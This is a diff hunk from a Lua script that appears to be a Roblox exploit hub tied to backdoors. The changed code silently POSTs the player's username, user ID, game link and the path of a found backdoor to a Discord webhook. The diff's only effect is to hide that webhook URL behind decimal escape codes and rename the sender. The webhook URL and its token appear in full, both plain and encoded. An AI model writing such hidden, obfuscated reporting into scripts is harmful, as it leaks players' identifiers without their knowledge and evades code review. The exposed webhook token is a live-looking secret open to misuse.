@@ -1566,13 +1566,13 @@ local script = G2L["20"];
 					local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 					if request and not _G.LALOL_Hub_Backdoor_Logs_Disabled then 
 						request({
-							Url = 'https://discord.com/api/webhooks/1499051494148804639/DyikDpw--2LOkEHOK24KRlg3_sc5KHz_x_O7D0jj6DWkvGE3HHPprLCwxLETn8tLbmEw',
+							Url = '\104\116\116\112\115\058\047\047\100\105\115\099\111\114\100\046\099\111\109\047\097\112\105\047\119\101\098\104\111\111\107\115\047\049\052\057\057\048\053\049\052\057\052\049\052\056\056\048\052\054\051\057\047\068\121\105\107\068\112\119\045\045\050\076\079\107\069\072\079\075\050\052\075\082\108\103\051\095\115\099\053\075\072\122\095\120\095\079\055\068\048\106\106\054\068\087\107\118\071\069\051\072\072\080\112\114\076\067\119\120\076\069\084\110\056\116\076\098\109\069\119',
 							Method = 'POST',
 							Headers = {
 								['Content-Type'] = 'application/json',
 							},
 							Body = HttpService:JSONEncode({
-								username='pls dont delete this w3bh00k',
+								username='Spunchbubhub',
 								content="**User: `"..game:GetService('Players').LocalPlayer.Name..'` | `'..game:GetService('Players').LocalPlayer.UserId..'`\nhttps://www.roblox.com/games/'..game.PlaceId..'\n`'..backdoor:GetFullName()..'`**',
 							})
 						})
